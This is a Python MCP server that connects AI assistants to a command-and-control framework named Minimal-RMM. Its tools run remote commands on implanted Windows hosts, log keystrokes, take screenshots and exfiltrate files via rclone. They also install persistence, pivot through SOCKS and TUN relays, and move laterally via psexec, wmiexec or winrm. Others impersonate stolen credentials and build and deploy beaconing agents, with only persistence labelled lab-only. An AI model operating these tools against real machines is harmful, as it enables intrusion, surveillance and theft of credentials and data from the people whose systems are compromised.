#!/usr/bin/env python3
"""
MCP server for Minimal-RMM — exposes operator API tools to Claude Desktop / Cursor.

Environment:
  RMM_SERVER_URL / RMM_BASE_URL  — RMM server base URL
  RMM_API_TOKEN                  — operator API token
  RMM_WORKSPACE_ID / RMM_WORKSPACE_TOKEN — optional scoped workspace credentials

Run:
  pip install mcp
  python mcp_rmm_server.py

Cursor MCP config (~/.cursor/mcp.json):
  {
    "mcpServers": {
      "minimal-rmm": {
        "command": "python",
        "args": ["/path/to/Minimal-RMM/mcp_rmm_server.py"],
        "env": {
          "RMM_SERVER_URL": "http://127.0.0.1:8787",
          "RMM_API_TOKEN": "your-token"
        }
      }
    }
  }
"""

from __future__ import annotations

import asyncio
from functools import wraps

from rmm_settings import bootstrap, getenv as settings_getenv

if __name__ == "__main__":
    bootstrap("client")

try:
    # mcp<2 exposes the server class under this name.
    from mcp.server.fastmcp import FastMCP
except ModuleNotFoundError as exc:
    # mcp>=2.0 renamed FastMCP to MCPServer; fall back only for that rename,
    # not when the "mcp" package itself is missing (pip install mcp).
    if exc.name != "mcp.server.fastmcp":
        raise
    from mcp.server.mcpserver import MCPServer as FastMCP

from rmm_tools import (
    tool_bloodhound,
    tool_list_ai_jobs,
    tool_get_ai_job,
    make_client,
    tool_settings,
    tool_embedding_profiles,
    tool_embedding_results,
    tool_run_embeddings,
    tool_delete_history,
    tool_clear_history,
    tool_exec_command,
    tool_get_agent_script,
    tool_deploy_agent_script,
    tool_build_go_agent,
    tool_get_events,
    tool_get_history_events,
    tool_get_history_session,
    tool_get_session,
    tool_health,
    tool_install_persistence,
    tool_kill_session,
    tool_list_history,
    tool_list_artifacts,
    tool_list_session_downloads,
    tool_list_socks,
    tool_list_tun,
    tool_list_sessions,
    tool_patch_config,
    tool_queue_command,
    tool_queue_download,
    tool_queue_exfil,
    tool_get_rclone_config,
    tool_queue_keylog,
    tool_queue_persistent,
    tool_queue_screenshot,
    tool_list_plugins,
    tool_list_plugin_release,
    tool_install_plugin_release,
    tool_list_plugin_sources,
    tool_save_plugin_source,
    tool_remove_plugin_source,
    tool_list_assets,
    tool_add_asset,
    tool_set_asset_enabled,
    tool_remove_asset,
    tool_profile_status,
    tool_start_profile,
    tool_stop_profile,
    tool_queue_pe_load,
    tool_queue_upload,
    tool_remove_persistence,
    tool_spawn_session,
    tool_make_token,
    tool_rev2self,
    tool_lateral_move,
    tool_session_uid,
    tool_start_socks,
    tool_start_tun,
    tool_stop_persistent,
    tool_stop_socks,
    tool_stop_tun,
    tool_creds_add,
    tool_creds_del,
    tool_creds_list,
    tool_spawnas,
    tool_runas,
)

mcp = FastMCP(
    "Minimal RMM",
    instructions=(
        "Control Minimal-RMM Windows agents via the operator REST API. "
        "Use list_sessions to discover hosts; session_ref accepts hostname or id prefix."
    ),
)

_cached_client = None


def _client():
    global _cached_client
    if _cached_client is None:
        _cached_client = make_client(
            settings_getenv("RMM_SERVER_URL") or settings_getenv("RMM_BASE_URL"),
            settings_getenv("RMM_API_TOKEN") or None,
        )
    return _cached_client


def _offload_tool(function):
    """Keep approved blocking tools off the MCP event loop, preserving schemas."""
    @wraps(function)
    async def execute(*args, **kwargs):
        """Dispatch a synchronous operator call to the thread executor."""
        return await asyncio.to_thread(function, *args, **kwargs)
    return execute


@mcp.tool()
def bloodhound(action: str = "preflight", run_id: str = "", options: dict | None = None) -> str:
    """Operate BloodHound CE: preflight/create/collect/import/status/verify/query/queries/report. library_search accepts options {text, platform, category, offset, limit} (limit 1-25); library_get accepts {id: GUID} and returns one full reference query. Originals are not executable; use mapped local template IDs with query. health reads readiness; ensure performs guarded MCP startup; ui waits for readiness then returns a proxy link. If state is 'uncertain' (a prior launch's reply was lost), reset clears that stuck dispatch so startup can be retried; it refuses mid-startup or once already ready. For workspace_request_id poll result with that ID as run_id. Poll status for collection/import and health for startup. Keep credentials in service settings."""
    return tool_bloodhound(_client(), action, run_id, options)


@mcp.tool()
def settings(action: str = "show", settings: dict | None = None) -> str:
    """Read redacted service settings or update typed overrides. Null removes an override. Restart required; environment takes precedence. Workspace settings use the local workspace API."""
    return tool_settings(_client(), action, settings)


@mcp.tool()
def embedding_profiles(action: str = "list", name: str = "", config: dict | None = None) -> str:
    """List/get/save/delete embedding profiles, or use action='defaults' for the repository preset. Use the local workspace URL in workspace mode; never include tokens in config."""
    return tool_embedding_profiles(_client(), action, name, config)


@mcp.tool()
def run_embeddings(session_ref: str, profile: str, documents: list[str]) -> str:
    """Classify explicit files/directories with a saved profile. Requires document-embeddings-autonomous.dll; missing DLL is a deployment blocker, not permission to substitute document-embeddings.dll or queue_pe_load command=Run. Inspect profile copy options and matching session events; queued is not completed."""
    return tool_run_embeddings(_client(), session_ref, profile, documents)


@mcp.tool()
def embedding_results(action: str = "list", name: str = "", session_ref: str = "", event_id: int = 0) -> str:
    """List/get/save/delete collections using an exact session output event. Vector-free results retain classifications, copy paths, errors, and dimensions; full vectors remain in workspace exports."""
    return tool_embedding_results(_client(), action, name, session_ref, event_id)


@mcp.tool()
@_offload_tool
def health() -> str:
    """Check RMM server API health."""
    return tool_health(_client())


@mcp.tool()
@_offload_tool
def list_sessions() -> str:
    """List all active RMM agent sessions."""
    return tool_list_sessions(_client())


@mcp.tool()
@_offload_tool
def get_session(session_ref: str) -> str:
    """Get session details by hostname, id prefix, or full UUID."""
    return tool_get_session(_client(), session_ref)


@mcp.tool()
@_offload_tool
def exec_command(session_ref: str, command: str, timeout: float = 120) -> str:
    """Run a command on the agent and wait for output."""
    return tool_exec_command(_client(), session_ref, command, timeout=timeout)


@mcp.tool()
def queue_command(session_ref: str, command: str, cmd_type: str = "oneshot") -> str:
    """Queue a command for the next agent beacon."""
    return tool_queue_command(_client(), session_ref, command, cmd_type=cmd_type)


@mcp.tool()
def patch_config(
    session_ref: str,
    sleep_seconds: int | None = None,
    jitter_percent: int | None = None,
) -> str:
    """Update beacon sleep interval and/or jitter percent."""
    return tool_patch_config(_client(), session_ref, sleep_seconds, jitter_percent)


@mcp.tool()
@_offload_tool
def get_events(session_ref: str, since: int = 0, limit: int = 50, forward: bool = False) -> str:
    """Fetch session events. Recognized embedding output omits vectors but retains classifications, copy paths, errors, and dimensions; full evidence remains in workspace storage."""
    return tool_get_events(_client(), session_ref, since=since, limit=limit, forward=forward)


@mcp.tool()
def kill_session(session_ref: str) -> str:
    """Kill an agent session."""
    return tool_kill_session(_client(), session_ref)


@mcp.tool()
def queue_download(session_ref: str, remote_path: str) -> str:
    """Queue remote file download from agent."""
    return tool_queue_download(_client(), session_ref, remote_path)


@mcp.tool()
def queue_exfil(
    session_ref: str,
    remote_path: str,
    profile: str | None = None,
    dest: str | None = None,
    mode: str = "auto",
) -> str:
    """Queue remote file or folder exfil via rclone from the agent (link in events when supported)."""
    return tool_queue_exfil(_client(), session_ref, remote_path, profile, dest, mode)


@mcp.tool()
def get_rclone_config() -> str:
    """Show rclone profiles and binary status on the RMM server."""
    return tool_get_rclone_config(_client())


@mcp.tool()
def queue_screenshot(session_ref: str) -> str:
    """Queue screenshot on agent."""
    return tool_queue_screenshot(_client(), session_ref)


@mcp.tool()
@_offload_tool
def list_plugins() -> str:
    """List PE plugins available on the RMM server for the Go agent."""
    return tool_list_plugins(_client())


@mcp.tool()
def list_plugin_sources() -> str:
    """List persisted plugin repositories, branches, and credential references."""
    return tool_list_plugin_sources(_client())


@mcp.tool()
def save_plugin_source(source_id: str, repository: str, branch: str = "main", label: str = "", credential_env: str = "RMM_PLUGIN_GITHUB_TOKEN") -> str:
    """Save a repository/branch source using an environment variable name, never a token."""
    return tool_save_plugin_source(_client(), source_id, repository, branch, label, credential_env)


@mcp.tool()
def remove_plugin_source(source_id: str) -> str:
    """Delete source configuration while retaining installed plugins."""
    return tool_remove_plugin_source(_client(), source_id)


@mcp.tool()
def list_plugin_release(tag: str = "latest", source: str = "default") -> str:
    """Inspect a compiled GitHub plugin release and resolve its exact tag."""
    return tool_list_plugin_release(_client(), tag, source)


@mcp.tool()
def install_plugin_release(name: str, tag: str, sha256: str = "", source: str = "default", source_revision: str = "") -> str:
    """Install one verified plugin from an exact release tag without executing it."""
    return tool_install_plugin_release(_client(), name, tag, sha256, source, source_revision)


@mcp.tool()
def list_assets(kind: str = "") -> str:
    """List URL-installed plugins, AI skills, and rclone profile files."""
    return tool_list_assets(_client(), kind)


@mcp.tool()
def add_asset(kind: str, url: str, name: str = "", enabled: bool = True) -> str:
    """Download and install a plugin, AI skill, or rclone file from an HTTP(S) URL."""
    return tool_add_asset(_client(), kind, url, name, enabled)


@mcp.tool()
def set_asset_enabled(kind: str, name: str, enabled: bool) -> str:
    """Enable or disable one managed operator asset."""
    return tool_set_asset_enabled(_client(), kind, name, enabled)


@mcp.tool()
def remove_asset(kind: str, name: str) -> str:
    """Remove one managed operator asset."""
    return tool_remove_asset(_client(), kind, name)


@mcp.tool()
def profile_status() -> str:
    """Show the active RMM-Profile and agent beacon URL."""
    return tool_profile_status(_client())


@mcp.tool()
def start_profile(name: str = "cloudflared", config: dict | None = None) -> str:
    """Start an installed RMM-Profile connector."""
    return tool_start_profile(_client(), name, config)


@mcp.tool()
def stop_profile() -> str:
    """Stop the active RMM-Profile connector."""
    return tool_stop_profile(_client())


@mcp.tool()
def queue_pe_load(
    session_ref: str,
    plugin: str,
    export: str = "Run",
    input: str = "",
    command: str = "",
) -> str:
    """Queue an isolated PE load. export=Run passes raw input; command wraps it in {command,input} and is only for plugins supporting that envelope. command=Run is not export=Run. Use run_embeddings for document classification."""
    return tool_queue_pe_load(
        _client(),
        session_ref,
        plugin,
        export=export,
        plugin_input=input,
        plugin_command=command,
    )


@mcp.tool()
def queue_upload(session_ref: str, local_path: str, remote_path: str) -> str:
    """Queue a local file or artifact_ref upload. Success means queued, not delivered. Record the get_events cursor before queuing, then wait for a new successful upload result matching this session and destination before copying, extracting, or executing. Missing results are inconclusive; do not blindly retry."""
    return tool_queue_upload(_client(), session_ref, local_path, remote_path)


@mcp.tool()
def list_socks() -> str:
    """List all active SOCKS5 listeners on the RMM server and their connected agents."""
    return tool_list_socks(_client())


@mcp.tool()
def start_socks(session_ref: str, port: int = 1080, bind_host: str = "127.0.0.1") -> str:
    """Start SOCKS5 on the RMM server; use socks5://bind_host:port from that host."""
    return tool_start_socks(_client(), session_ref, port=port, bind_host=bind_host)


@mcp.tool()
def stop_socks(session_ref: str) -> str:
    """Stop SOCKS5 relay for the session."""
    return tool_stop_socks(_client(), session_ref)


@mcp.tool()
def list_tun() -> str:
    """List active server-side TUN relays configured on the RMM server."""
    return tool_list_tun(_client())


@mcp.tool()
def start_tun(
    session_ref: str,
    device: str,
    route: str = "",
    tun_address: str = "198.18.0.1/15",
    interface: str = "",
    mtu: int = 1500,
    udp_timeout_seconds: int = 300,
    routes: list[str] | None = None,
) -> str:
    """Create a server-side TUN relay whose traffic exits through a Go agent."""
    return tool_start_tun(
        _client(),
        session_ref,
        device,
        route=route,
        routes=routes,
        tun_address=tun_address,
        interface=interface,
        mtu=mtu,
        udp_timeout_seconds=udp_timeout_seconds,
    )


@mcp.tool()
def stop_tun(session_ref: str) -> str:
    """Disable the server-side TUN relay for a session."""
    return tool_stop_tun(_client(), session_ref)


@mcp.tool()
def queue_persistent(session_ref: str, command: str) -> str:
    """Set a persistent command on the agent until stop_persistent."""
    return tool_queue_persistent(_client(), session_ref, command)


@mcp.tool()
def stop_persistent(session_ref: str) -> str:
    """Stop the agent persistent command."""
    return tool_stop_persistent(_client(), session_ref)


@mcp.tool()
def list_history() -> str:
    """List archived (ended) session transcripts."""
    return tool_list_history(_client())


@mcp.tool()
def get_history_session(session_ref: str) -> str:
    """Get metadata for an archived session by id prefix, full id, or hostname."""
    return tool_get_history_session(_client(), session_ref)


@mcp.tool()
def get_history_events(session_ref: str, since: int = 0, limit: int = 500, forward: bool = False) -> str:
    """Fetch read-only event transcript for an archived session."""
    return tool_get_history_events(_client(), session_ref, since=since, limit=limit, forward=forward)


@mcp.tool()
def delete_history(session_ref: str) -> str:
    """Permanently delete an archived session transcript (ended sessions only)."""
    return tool_delete_history(_client(), session_ref)


@mcp.tool()
def clear_history() -> str:
    """Permanently delete all archived (ended) session transcripts from disk."""
    return tool_clear_history(_client())


@mcp.tool()
def list_session_downloads(session_ref: str) -> str:
    """List files downloaded from the agent for a live session."""
    return tool_list_session_downloads(_client(), session_ref)


@mcp.tool()
def list_artifacts(kind: str = "downloads") -> str:
    """List downloads or screenshots from every agent."""
    return tool_list_artifacts(_client(), kind)


@mcp.tool()
@_offload_tool
def list_ai_jobs(session_id: str = "") -> str:
    """List persisted AI jobs, optionally filtered by full session ID; never starts or retries work."""
    return tool_list_ai_jobs(_client(), session_id)


@mcp.tool()
@_offload_tool
def get_ai_job(job_id: str) -> str:
    """Read an AI job's status, progress, and result. Interrupted jobs may have executed actions; do not blindly resubmit."""
    return tool_get_ai_job(_client(), job_id)


@mcp.tool()
def get_agent_script() -> str:
    """Fetch the full client_rmm.ps1 agent script from the server."""
    return tool_get_agent_script(_client())


@mcp.tool()
def deploy_agent_script(
    session_id: str = "",
    sleep_seconds: int = 60,
    jitter_percent: int = 30,
    http_proxy: str = "",
    workspace_id: str = "",
) -> str:
    """Render a ready-to-run client_rmm.ps1 configured with the active beacon URL and secret; returns a portable artifact_ref for queue_upload."""
    return tool_deploy_agent_script(_client(), session_id, sleep_seconds, jitter_percent, http_proxy, workspace_id)


@mcp.tool()
def build_go_agent(
    goos: str = "windows",
    goarch: str = "amd64",
    session_id: str = "",
    sleep_seconds: int = 60,
    jitter_percent: int = 30,
    http_proxy: str = "",
    workspace_id: str = "",
    stageless: bool = False,
) -> str:
    """Build the repository Go agent with the active connection settings embedded; returns the ZIP artifact_ref for queue_upload. Set stageless=True to skip the psexec stage1 launcher (smaller binary, no lateral movement support)."""
    return tool_build_go_agent(_client(), goos, goarch, session_id, sleep_seconds, jitter_percent, http_proxy, workspace_id, stageless)


@mcp.tool()
def queue_keylog(session_ref: str, action: str) -> str:
    """Queue keylogger start, stop, or dump on the agent."""
    return tool_queue_keylog(_client(), session_ref, action)


@mcp.tool()
def install_persistence(session_ref: str) -> str:
    """Queue agent persistence install (lab use only)."""
    return tool_install_persistence(_client(), session_ref)


@mcp.tool()
def remove_persistence(session_ref: str) -> str:
    """Queue agent persistence removal (lab use only)."""
    return tool_remove_persistence(_client(), session_ref)


@mcp.tool()
@_offload_tool
def spawn_session(
    session_ref: str,
    verify: bool = True,
    spawn_timeout: float = 120,
    register_timeout: float = 60,
    verify_timeout: float = 120,
) -> str:
    """Spawn a detached second Go agent from a live Go session with a fresh session ID, then require registration and exact fresh probe responses. verify=False reports an unconfirmed request only."""
    return tool_spawn_session(
        _client(),
        session_ref,
        verify=verify,
        spawn_timeout=spawn_timeout,
        register_timeout=register_timeout,
        verify_timeout=verify_timeout,
    )


@mcp.tool()
@_offload_tool
def make_token(session_ref: str, user: str, domain: str = "", password: str = "", timeout: float = 120) -> str:
    """Create a runas /netonly style network identity on a Go agent session; never repeat the password in responses."""
    return tool_make_token(_client(), session_ref, user, domain=domain, password=password, timeout=timeout)


@mcp.tool()
@_offload_tool
def rev2self(session_ref: str, timeout: float = 120) -> str:
    """Revert a Go agent session to its own network identity after make_token."""
    return tool_rev2self(_client(), session_ref, timeout=timeout)


@mcp.tool()
@_offload_tool
def lateral_move(
    session_ref: str,
    method: str,
    host: str,
    verify: bool = True,
    exec_timeout: float = 300,
    register_timeout: float = 60,
    verify_timeout: float = 120,
) -> str:
    """Start a Go agent on another host through psexec, wmiexec, or winrm; waits for registration and verifies both sessions."""
    return tool_lateral_move(
        _client(),
        session_ref,
        method,
        host,
        verify=verify,
        exec_timeout=exec_timeout,
        register_timeout=register_timeout,
        verify_timeout=verify_timeout,
    )


@mcp.tool()
@_offload_tool
def session_uid(session_ref: str, timeout: float = 120) -> str:
    """Show the identity a Go agent runs under, plus any active make_token network identity."""
    return tool_session_uid(_client(), session_ref, timeout=timeout)


# ── Credential store (workspace-scoped, passwords never logged or returned) ───

@mcp.tool()
def creds_add(user: str, domain: str = "", password: str = "") -> str:
    """Add credentials to the workspace store. Returns a cred_id to pass to make_token, spawnas, or runas. Passwords are stored server-side only."""
    return tool_creds_add(_client(), domain=domain, user=user, password=password)


@mcp.tool()
def creds_del(cred_id: str) -> str:
    """Remove a credential entry from the workspace store by cred_id."""
    return tool_creds_del(_client(), cred_id)


@mcp.tool()
def creds_list() -> str:
    """List stored workspace credentials (identity labels only, no passwords)."""
    return tool_creds_list(_client())


# ── Identity-aware process creation ───────────────────────────────────────────

@mcp.tool()
@_offload_tool
def spawnas(
    session_ref: str,
    cred_id: str = "",
    user: str = "",
    domain: str = "",
    password: str = "",
    verify: bool = True,
    spawn_timeout: float = 120,
    register_timeout: float = 60,
    verify_timeout: float = 120,
) -> str:
    """Spawn a new agent copy under a different process identity using the cascade (CreateProcessAsUser → CreateProcessWithTokenW → CreateProcessWithLogonW → CreateProcessA). Pass cred_id from creds_add, or domain/user/password directly. Never repeat credentials in responses."""
    return tool_spawnas(
        _client(), session_ref,
        cred_id=cred_id, user=user, domain=domain, password=password,
        verify=verify, spawn_timeout=spawn_timeout,
        register_timeout=register_timeout, verify_timeout=verify_timeout,
    )


@mcp.tool()
@_offload_tool
def runas(
    session_ref: str,
    command: str,
    cred_id: str = "",
    user: str = "",
    domain: str = "",
    password: str = "",
    timeout: float = 120,
) -> str:
    """Run a shell command on a Go agent under a different process identity using the cascade. Pass cred_id from creds_add, or domain/user/password directly. Never repeat credentials in responses."""
    return tool_runas(
        _client(), session_ref, command,
        cred_id=cred_id, user=user, domain=domain, password=password,
        timeout=timeout,
    )


if __name__ == "__main__":
    mcp.run()
